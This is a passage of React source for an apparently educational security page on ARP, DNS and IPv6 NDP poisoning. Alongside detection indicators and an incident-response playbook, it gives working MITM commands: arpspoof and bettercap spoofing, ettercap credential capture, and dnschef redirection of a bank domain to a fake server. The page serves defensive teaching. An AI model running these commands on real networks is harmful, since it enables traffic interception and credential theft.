                <Alert severity="error" sx={{ mt: 2 }}>
                  <Typography variant="body2">
                    <strong>High Risk:</strong> This is one of the most common attacks in internal pentests. 
                    Disable LLMNR and NBT-NS via Group Policy immediately if not needed!
                  </Typography>
                </Alert>
              </Paper>

              <Alert severity="error" sx={{ mb: 3 }}>
                <AlertTitle>High-Impact Attack</AlertTitle>
                A successful DNS cache poisoning attack against a major resolver can affect millions of users,
                redirecting them to phishing sites or malware distribution points without any indication of compromise.
              </Alert>
            </Paper>

            {/* ==================== IPv6 NDP ATTACKS ==================== */}
            <Paper id="ipv6-ndp" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#8b5cf6", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <DevicesIcon sx={{ color: "#8b5cf6" }} />
                IPv6 NDP Attacks (Modern ARP Spoofing)
              </Typography>

              <Alert severity="info" sx={{ mb: 3 }}>
                <AlertTitle>Why This Matters</AlertTitle>
                IPv6 is becoming more common. NDP (Neighbor Discovery Protocol) replaces ARP in IPv6 networks, 
                but has similar vulnerabilities. Security professionals must understand both.
              </Alert>

              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#8b5cf6", 0.05), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#8b5cf6" }}>
                  🔄 ARP vs NDP: Same Problem, New Protocol
                </Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>IPv4 ARP</Typography>
                    <List dense>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Broadcasts ARP Request" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Uses MAC address FF:FF:FF:FF:FF:FF" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• No authentication" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Cache poisoning via gratuitous ARP" /></ListItem>
                    </List>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>IPv6 NDP</Typography>
                    <List dense>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Multicasts Neighbor Solicitation" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Uses ICMPv6 messages" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• SEND (optional authentication) rarely used" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Cache poisoning via NA/RA spoofing" /></ListItem>
                    </List>
                  </Grid>
                </Grid>
              </Paper>

              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>NDP Message Types & Attack Vectors</Typography>
              <TableContainer component={Paper} sx={{ borderRadius: 2, mb: 3 }}>
                <Table size="small">
                  <TableHead>
                    <TableRow sx={{ bgcolor: alpha("#8b5cf6", 0.1) }}>
                      <TableCell sx={{ fontWeight: 700 }}>Message Type</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>ICMPv6 Type</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Purpose</TableCell>
                      <TableCell sx={{ fontWeight: 700 }}>Attack Potential</TableCell>
                    </TableRow>
                  </TableHead>
                  <TableBody>
                    {[
                      { msg: "Router Solicitation (RS)", type: "133", purpose: "Host asks for router info", attack: "Trigger rogue RA responses" },
                      { msg: "Router Advertisement (RA)", type: "134", purpose: "Router announces itself", attack: "Rogue RA - redirect default gateway" },
                      { msg: "Neighbor Solicitation (NS)", type: "135", purpose: "Like ARP Request", attack: "DoS via NS flood" },
                      { msg: "Neighbor Advertisement (NA)", type: "136", purpose: "Like ARP Reply", attack: "Spoofed NA - MITM attacks" },
                      { msg: "Redirect", type: "137", purpose: "Better route notification", attack: "Traffic redirection" },
                    ].map((row) => (
                      <TableRow key={row.msg}>
                        <TableCell sx={{ fontWeight: 600 }}>{row.msg}</TableCell>
                        <TableCell>{row.type}</TableCell>
                        <TableCell>{row.purpose}</TableCell>
                        <TableCell sx={{ color: "#ef4444" }}>{row.attack}</TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </TableContainer>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>
                      🚨 Rogue Router Advertisement Attack
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2 }}>
                      The most dangerous IPv6 attack. An attacker sends fake Router Advertisements claiming to be 
                      the default gateway. All hosts automatically configure to use the attacker as their router.
                    </Typography>
                    <Typography variant="body2" sx={{ fontWeight: 600 }}>Impact:</Typography>
                    <List dense>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Full MITM position" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Can advertise malicious DNS servers" /></ListItem>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Affects all hosts on the segment" /></ListItem>
                    </List>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle1" sx={{ fontWeight: 700, color: "#22c55e", mb: 1 }}>
                      🛡️ IPv6 NDP Defense: RA Guard
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2 }}>
                      RA Guard is a switch feature that blocks Router Advertisements from unauthorized ports.
                      Only designated router ports are allowed to send RAs.
                    </Typography>
                    <Typography variant="body2" sx={{ fontWeight: 600 }}>Cisco Configuration:</Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1, mt: 1 }}>
                      ipv6 nd raguard policy BLOCK_RA<br />
                      &nbsp;&nbsp;device-role host<br />
                      interface GigabitEthernet0/1<br />
                      &nbsp;&nbsp;ipv6 nd raguard attach-policy BLOCK_RA
                    </Box>
                  </Paper>
                </Grid>
              </Grid>
            </Paper>

            {/* ==================== LAB SETUP ==================== */}
            <Paper id="lab-setup" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#22c55e", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <SettingsIcon sx={{ color: "#22c55e" }} />
                Safe Lab Environment Setup
              </Typography>

              <Alert severity="warning" sx={{ mb: 3 }}>
                <AlertTitle>⚠️ Legal Warning</AlertTitle>
                <Typography variant="body2">
                  Performing ARP/DNS attacks on networks without explicit written authorization is <strong>illegal</strong> and 
                  can result in criminal charges. Always practice in isolated lab environments only.
                </Typography>
              </Alert>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                To safely learn and practice these techniques, set up an isolated virtual lab environment. 
                Here are recommended approaches:
              </Typography>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                      🖥️ Virtual Lab Option 1: VirtualBox/VMware
                    </Typography>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Required VMs:</Typography>
                    <List dense>
                      <ListItem>
                        <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>1</Typography></ListItemIcon>
                        <ListItemText primary="Kali Linux" secondary="Attacker machine with pre-installed tools" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>2</Typography></ListItemIcon>
                        <ListItemText primary="Windows 10/11" secondary="Victim machine for testing" />
                      </ListItem>
                      <ListItem>
                        <ListItemIcon><Typography sx={{ fontWeight: 700, color: "#22c55e" }}>3</Typography></ListItemIcon>
                        <ListItemText primary="pfSense/OPNsense" secondary="Router/firewall for realistic setup" />
                      </ListItem>
                    </List>
                    <Alert severity="info" sx={{ mt: 2 }}>
                      Set all VMs to "Internal Network" or "Host-Only" to isolate from real networks.
                    </Alert>
                  </Paper>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 3, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                      🐳 Virtual Lab Option 2: Docker Compose
                    </Typography>
                    <Typography variant="body2" sx={{ mb: 2 }}>
                      Lighter alternative using containers. Create an isolated Docker network:
                    </Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1, overflow: "auto" }}>
                      {`# Create isolated network
docker network create --driver bridge \\
  --subnet=192.168.100.0/24 lab_network

# Run containers
docker run -d --name attacker \\
  --network lab_network kalilinux/kali-rolling

docker run -d --name victim \\
  --network lab_network ubuntu:22.04`}
                    </Box>
                  </Paper>
                </Grid>
              </Grid>

              <Box sx={{ mt: 4 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Pre-Installed Lab Environments</Typography>
                <Grid container spacing={2}>
                  {[
                    { name: "DVWA", desc: "Damn Vulnerable Web App - web attack practice", link: "https://dvwa.co.uk/" },
                    { name: "Metasploitable", desc: "Intentionally vulnerable Linux VM", link: "https://sourceforge.net/projects/metasploitable/" },
                    { name: "VulnHub", desc: "Collection of vulnerable VMs", link: "https://www.vulnhub.com/" },
                    { name: "HackTheBox", desc: "Online penetration testing labs", link: "https://www.hackthebox.com/" },
                    { name: "TryHackMe", desc: "Guided cybersecurity training", link: "https://tryhackme.com/" },
                    { name: "PentesterLab", desc: "Web security exercises", link: "https://pentesterlab.com/" },
                  ].map((env, idx) => (
                    <Grid item xs={12} sm={6} md={4} key={idx}>
                      <Paper sx={{ p: 2, borderRadius: 2, height: "100%", border: `1px solid ${alpha("#22c55e", 0.2)}` }}>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{env.name}</Typography>
                        <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{env.desc}</Typography>
                        <Typography variant="caption" sx={{ color: accent, wordBreak: "break-all" }}>{env.link}</Typography>
                      </Paper>
                    </Grid>
                  ))}
                </Grid>
              </Box>

              <Box sx={{ mt: 4 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Essential Tools for Learning</Typography>
                <TableContainer component={Paper} sx={{ borderRadius: 2 }}>
                  <Table size="small">
                    <TableHead>
                      <TableRow sx={{ bgcolor: alpha("#22c55e", 0.1) }}>
                        <TableCell sx={{ fontWeight: 700 }}>Tool</TableCell>
                        <TableCell sx={{ fontWeight: 700 }}>Purpose</TableCell>
                        <TableCell sx={{ fontWeight: 700 }}>Install Command (Kali)</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      {[
                        { tool: "Wireshark", purpose: "Packet capture and analysis", cmd: "apt install wireshark" },
                        { tool: "arpwatch", purpose: "Monitor ARP activity", cmd: "apt install arpwatch" },
                        { tool: "dsniff", purpose: "Network auditing tools (arpspoof)", cmd: "apt install dsniff" },
                        { tool: "ettercap", purpose: "MITM attack framework", cmd: "apt install ettercap-graphical" },
                        { tool: "bettercap", purpose: "Modern network attack tool", cmd: "apt install bettercap" },
                        { tool: "mitmproxy", purpose: "Interactive HTTPS proxy", cmd: "apt install mitmproxy" },
                        { tool: "dnschef", purpose: "DNS proxy for manipulation", cmd: "apt install dnschef" },
                        { tool: "responder", purpose: "LLMNR/NBT-NS/mDNS poisoner", cmd: "apt install responder" },
                      ].map((row) => (
                        <TableRow key={row.tool}>
                          <TableCell sx={{ fontWeight: 600, color: "#22c55e" }}>{row.tool}</TableCell>
                          <TableCell>{row.purpose}</TableCell>
                          <TableCell sx={{ fontFamily: "monospace", fontSize: "0.8rem" }}>{row.cmd}</TableCell>
                        </TableRow>
                      ))}
                    </TableBody>
                  </Table>
                </TableContainer>
              </Box>
            </Paper>

            {/* ==================== ATTACK SCENARIOS ==================== */}
            <Paper id="attack-scenarios" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#f59e0b", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <PsychologyIcon sx={{ color: "#f59e0b" }} />
                Attack Scenarios (Educational Walkthrough)
              </Typography>

              <Alert severity="error" sx={{ mb: 3 }}>
                <AlertTitle>🚨 FOR EDUCATIONAL PURPOSES IN LAB ENVIRONMENTS ONLY</AlertTitle>
                These walkthroughs are for understanding attack mechanics to build better defenses. 
                Never use these techniques on networks you don't own.
              </Alert>

              {/* Scenario 1 */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#f59e0b" }}>
                  📌 Scenario 1: Classic ARP MITM Attack
                </Typography>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  <strong>Situation:</strong> Attacker wants to intercept traffic between a victim (192.168.1.100) 
                  and the gateway (192.168.1.1) on the same network.
                </Typography>
                
                <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Step-by-Step Process:</Typography>
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>1. Enable IP Forwarding</Typography>
                      <Typography variant="body2" sx={{ mb: 1, color: "text.secondary" }}>
                        Without this, intercepted packets are dropped causing DoS instead of MITM.
                      </Typography>
                      <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1 }}>
                        # Linux<br />
                        echo 1 {">"} /proc/sys/net/ipv4/ip_forward<br /><br />
                        # Or permanently in sysctl.conf<br />
                        net.ipv4.ip_forward = 1
                      </Box>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>2. Discover Network</Typography>
                      <Typography variant="body2" sx={{ mb: 1, color: "text.secondary" }}>
                        Identify targets and gateway IP/MAC addresses.
                      </Typography>
                      <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1 }}>
                        # Find your gateway<br />
                        ip route | grep default<br /><br />
                        # Discover hosts<br />
                        nmap -sn 192.168.1.0/24<br /><br />
                        # View current ARP cache<br />
                        arp -a
                      </Box>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>3. Execute ARP Spoofing</Typography>
                      <Typography variant="body2" sx={{ mb: 1, color: "text.secondary" }}>
                        Poison both victim and gateway ARP caches.
                      </Typography>
                      <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1 }}>
                        # Using arpspoof (run in 2 terminals)<br />
                        arpspoof -i eth0 -t 192.168.1.100 192.168.1.1<br />
                        arpspoof -i eth0 -t 192.168.1.1 192.168.1.100<br /><br />
                        # Or using bettercap<br />
                        bettercap -iface eth0<br />
                        {">"} net.probe on<br />
                        {">"} set arp.spoof.targets 192.168.1.100<br />
                        {">"} arp.spoof on
                      </Box>
                    </Paper>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#000", 0.02), borderRadius: 2 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>4. Capture Traffic</Typography>
                      <Typography variant="body2" sx={{ mb: 1, color: "text.secondary" }}>
                        Now all traffic flows through attacker. Capture and analyze.
                      </Typography>
                      <Box sx={{ fontFamily: "monospace", fontSize: "0.8rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1 }}>
                        # Capture with Wireshark<br />
                        wireshark -i eth0 -k<br /><br />
                        # Or tcpdump<br />
                        tcpdump -i eth0 -w capture.pcap<br /><br />
                        # Capture HTTP credentials<br />
                        ettercap -T -q -i eth0 -M arp:remote /192.168.1.1// /192.168.1.100//
                      </Box>
                    </Paper>
                  </Grid>
                </Grid>
              </Paper>

              {/* Scenario 2 */}
              <Paper sx={{ p: 3, mb: 3, bgcolor: alpha("#3b82f6", 0.03), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#3b82f6" }}>
                  📌 Scenario 2: DNS Spoofing with ARP MITM
                </Typography>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  <strong>Situation:</strong> After establishing MITM position, attacker wants to redirect 
                  specific website traffic to a fake server.
                </Typography>
                
                <Grid container spacing={2}>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Using dnschef:</Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1 }}>
                      {`# Create fake DNS entries file
echo "bank.com=192.168.1.50" > dns_hosts.txt

# Run dnschef
dnschef --fakeip 192.168.1.50 \\
  --fakedomains bank.com,*.bank.com \\
  --interface 0.0.0.0 --port 53

# Configure iptables to redirect DNS
iptables -t nat -A PREROUTING \\
  -p udp --dport 53 -j REDIRECT --to-port 53`}
                    </Box>
                  </Grid>
                  <Grid item xs={12} md={6}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Using bettercap (all-in-one):</Typography>
                    <Box sx={{ fontFamily: "monospace", fontSize: "0.75rem", bgcolor: alpha("#000", 0.05), p: 2, borderRadius: 1 }}>
                      {`# Start bettercap
bettercap -iface eth0

# In bettercap console:
> set dns.spoof.domains bank.com,*.bank.com
> set dns.spoof.address 192.168.1.50
> dns.spoof on

# Combined with ARP spoofing:
> set arp.spoof.targets 192.168.1.100
> arp.spoof on
> dns.spoof on`}
                    </Box>
                  </Grid>
                </Grid>
              </Paper>

              {/* What defenders learn */}
              <Paper sx={{ p: 3, bgcolor: alpha("#22c55e", 0.05), borderRadius: 2 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, color: "#22c55e" }}>
                  🛡️ What Defenders Learn From These Scenarios
                </Typography>
                <Grid container spacing={2}>
                  {[
                    { lesson: "ARP spoofing requires local network access", defense: "Use VLANs to segment networks and limit attack surface" },
                    { lesson: "IP forwarding must be enabled for MITM", defense: "Detect unusual gateway behavior with monitoring" },
                    { lesson: "Both victim AND gateway must be poisoned", defense: "Static ARP entries on critical servers prevent one side" },
                    { lesson: "DNS spoofing works alongside ARP MITM", defense: "Use encrypted DNS (DoH/DoT) to bypass local manipulation" },
                    { lesson: "Attacks need to be continuous", defense: "Frequent ARP changes trigger DAI alerts" },
                  ].map((item, idx) => (
                    <Grid item xs={12} md={6} key={idx}>
                      <Box sx={{ display: "flex", gap: 1 }}>
                        <CheckCircleIcon sx={{ color: "#22c55e", flexShrink: 0, mt: 0.5 }} />
                        <Box>
                          <Typography variant="body2" sx={{ fontWeight: 600 }}>{item.lesson}</Typography>
                          <Typography variant="caption" color="text.secondary">{item.defense}</Typography>
                        </Box>
                      </Box>
                    </Grid>
                  ))}
                </Grid>
              </Paper>
            </Paper>

            {/* ==================== ATTACK FLOW ==================== */}
            <Paper id="attack-flow" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha(accent, 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <AccountTreeIcon sx={{ color: accent }} />
                Combined Attack Flow
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                ARP and DNS poisoning are often combined for more sophisticated attacks. ARP poisoning provides the
                network position, while DNS poisoning enables targeted redirection of specific services.
              </Typography>

              <Grid container spacing={3}>
                {[
                  { step: 1, title: "Network Reconnaissance", desc: "Attacker identifies gateway, targets, and network topology using passive sniffing", icon: <SearchIcon /> },
                  { step: 2, title: "ARP Cache Poisoning", desc: "Sends spoofed ARP replies to victim and gateway, establishing MITM position", icon: <WifiIcon /> },
                  { step: 3, title: "Traffic Interception", desc: "Enables IP forwarding to relay traffic while capturing packets", icon: <VisibilityIcon /> },
                  { step: 4, title: "DNS Spoofing", desc: "Intercepts DNS queries and returns false responses for target domains", icon: <DnsIcon /> },
                  { step: 5, title: "Credential Harvesting", desc: "Victim connects to fake sites, credentials captured", icon: <LockIcon /> },
                  { step: 6, title: "Session Hijacking", desc: "Steals cookies, tokens, or modifies traffic in real-time", icon: <BugReportIcon /> },
                ].map((item) => (
                  <Grid item xs={12} md={4} key={item.step}>
                    <Paper
                      sx={{
                        p: 3,
                        borderRadius: 2,
                        height: "100%",
                        bgcolor: alpha(accent, 0.02),
                        border: `1px solid ${alpha(accent, 0.1)}`,
                        position: "relative",
                      }}
                    >
                      <Box
                        sx={{
                          position: "absolute",
                          top: -12,
                          left: 16,
                          bgcolor: accent,
                          color: "white",
                          width: 28,
                          height: 28,
                          borderRadius: "50%",
                          display: "flex",
                          alignItems: "center",
                          justifyContent: "center",
                          fontWeight: 700,
                        }}
                      >
                        {item.step}
                      </Box>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1.5, mt: 1 }}>
                        <Box sx={{ color: accent }}>{item.icon}</Box>
                        <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{item.title}</Typography>
                      </Box>
                      <Typography variant="body2" color="text.secondary">{item.desc}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>
            </Paper>

            {/* ==================== REAL WORLD CASES ==================== */}
            <Paper id="real-world" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#8b5cf6", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <HistoryIcon sx={{ color: "#8b5cf6" }} />
                Real-World Incidents
              </Typography>

              <Typography variant="body1" sx={{ mb: 3, lineHeight: 1.8 }}>
                ARP and DNS poisoning attacks have been used in numerous high-profile incidents, from nation-state operations
                to financially motivated cybercrime.
              </Typography>

              <Grid container spacing={2}>
                {realWorldIncidents.map((incident, idx) => (
                  <Grid item xs={12} md={6} key={idx}>
                    <Paper sx={{ p: 2.5, borderRadius: 2, bgcolor: alpha("#8b5cf6", 0.03), height: "100%" }}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 1 }}>
                        <Chip label={incident.year} size="small" sx={{ bgcolor: "#8b5cf6", color: "white", fontWeight: 700 }} />
                        <Typography variant="subtitle1" sx={{ fontWeight: 700 }}>{incident.name}</Typography>
                      </Box>
                      <Typography variant="body2" color="text.secondary">{incident.impact}</Typography>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              <Alert severity="info" sx={{ mt: 3 }}>
                <AlertTitle>Learning from History</AlertTitle>
                These incidents demonstrate that DNS and ARP attacks remain relevant threats. Modern defenses like DNSSEC,
                DoH/DoT, and switch security features were developed in response to real attacks.
              </Alert>
            </Paper>

            {/* ==================== DETECTION ==================== */}
            <Paper id="detection" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#f59e0b", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <SearchIcon sx={{ color: "#f59e0b" }} />
                Detection Techniques
              </Typography>

              <Grid container spacing={3}>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>ARP Poisoning Indicators</Typography>
                  <List>
                    {[
                      "Multiple IPs mapping to the same MAC address",
                      "Frequent ARP cache changes for gateway",
                      "Unsolicited ARP replies (gratuitous ARPs)",
                      "MAC address changes for known devices",
                      "Network latency increases",
                      "TLS certificate warnings",
                    ].map((item, idx) => (
                      <ListItem key={idx}>
                        <ListItemIcon><WarningIcon sx={{ color: "#f59e0b" }} /></ListItemIcon>
                        <ListItemText primary={item} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
                <Grid item xs={12} md={6}>
                  <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>DNS Poisoning Indicators</Typography>
                  <List>
                    {[
                      "DNS responses from unexpected IP addresses",
                      "Unusually short TTL values",
                      "DNSSEC validation failures",
                      "Certificate mismatches for HTTPS sites",
                      "Redirects to suspicious domains",
                      "Multiple DNS responses for single query",
                    ].map((item, idx) => (
                      <ListItem key={idx}>
                        <ListItemIcon><WarningIcon sx={{ color: "#f59e0b" }} /></ListItemIcon>
                        <ListItemText primary={item} />
                      </ListItem>
                    ))}
                  </List>
                </Grid>
              </Grid>

              <Box sx={{ mt: 3 }}>
                <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Detection Matrix</Typography>
                <TableContainer component={Paper} sx={{ bgcolor: alpha(theme.palette.background.paper, 0.5) }}>
                  <Table>
                    <TableHead>
                      <TableRow>
                        <TableCell sx={{ fontWeight: 700 }}>Attack Stage</TableCell>
                        <TableCell sx={{ fontWeight: 700 }}>Indicator</TableCell>
                        <TableCell sx={{ fontWeight: 700 }}>Data Source</TableCell>
                        <TableCell sx={{ fontWeight: 700 }}>Detection Method</TableCell>
                      </TableRow>
                    </TableHead>
                    <TableBody>
                      <TableRow>
                        <TableCell>ARP Spoofing</TableCell>
                        <TableCell>MAC/IP binding changes</TableCell>
                        <TableCell>ARP cache, switch logs</TableCell>
                        <TableCell>arpwatch, DAI alerts</TableCell>
                      </TableRow>
                      <TableRow>
                        <TableCell>MITM Position</TableCell>
                        <TableCell>Traffic anomalies</TableCell>
                        <TableCell>NetFlow, packet capture</TableCell>
                        <TableCell>Traffic analysis</TableCell>
                      </TableRow>
                      <TableRow>
                        <TableCell>DNS Spoofing</TableCell>
                        <TableCell>Response anomalies</TableCell>
                        <TableCell>DNS logs, captures</TableCell>
                        <TableCell>Response validation</TableCell>
                      </TableRow>
                      <TableRow>
                        <TableCell>Cache Poisoning</TableCell>
                        <TableCell>Wrong IP for domains</TableCell>
                        <TableCell>Resolver cache</TableCell>
                        <TableCell>DNSSEC validation</TableCell>
                      </TableRow>
                    </TableBody>
                  </Table>
                </TableContainer>
              </Box>
            </Paper>

            {/* ==================== INCIDENT RESPONSE ==================== */}
            <Paper id="incident-response" sx={{ p: 4, mb: 4, borderRadius: 3, border: `1px solid ${alpha("#ef4444", 0.1)}` }}>
              <Typography variant="h4" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 1 }}>
                <GavelIcon sx={{ color: "#ef4444" }} />
                Incident Response Playbook
              </Typography>

              <Alert severity="error" sx={{ mb: 3 }}>
                <AlertTitle>🚨 Active Attack Response</AlertTitle>
                If you suspect an ARP/DNS poisoning attack is in progress, follow these steps immediately. 
                Speed is critical — credentials may be actively stolen.
              </Alert>

              {/* Immediate Response */}
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Phase 1: Immediate Containment (First 15 Minutes)</Typography>
              <Grid container spacing={2} sx={{ mb: 4 }}>
                {[
                  { step: 1, action: "Disconnect Affected Systems", detail: "Remove suspected victims from the network (unplug cable or disable WiFi) to stop ongoing data exfiltration", cmd: "# Windows: netsh interface set interface \"Ethernet\" disable" },
                  { step: 2, action: "Clear ARP Cache", detail: "Remove poisoned entries from affected systems", cmd: "# Windows: arp -d *\n# Linux: ip neigh flush all" },
                  { step: 3, action: "Identify Attack Source", detail: "Check ARP tables and switch port mappings to find the attacking device", cmd: "# Cisco: show ip arp\n# show mac address-table" },
                  { step: 4, action: "Block Attacker Port", detail: "Disable the switch port of the attacking device immediately", cmd: "# Cisco: interface Gi0/X\nshutdown" },
                ].map((item) => (
                  <Grid item xs={12} md={6} key={item.step}>
                    <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.03), borderRadius: 2, height: "100%" }}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                        <Box sx={{ bgcolor: "#ef4444", color: "white", width: 24, height: 24, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontWeight: 700, fontSize: "0.8rem" }}>
                          {item.step}
                        </Box>
                        <Typography variant="subtitle2" sx={{ fontWeight: 700 }}>{item.action}</Typography>
                      </Box>
                      <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>{item.detail}</Typography>
                      <Box sx={{ fontFamily: "monospace", fontSize: "0.7rem", bgcolor: alpha("#000", 0.05), p: 1, borderRadius: 1, whiteSpace: "pre-wrap" }}>
                        {item.cmd}
                      </Box>
                    </Paper>
                  </Grid>
                ))}
              </Grid>

              {/* Investigation */}
              <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>Phase 2: Investigation (Next 1-4 Hours)</Typography>
              <Grid container spacing={2} sx={{ mb: 4 }}>
                <Grid item xs={12} md={6}>
                  <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.03), borderRadius: 2, height: "100%" }}>
                    <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Evidence Collection</Typography>
                    <List dense>
                      <ListItem sx={{ py: 0 }}><ListItemText primary="• Export switch logs (ARP, MAC tables)" /></ListItem>
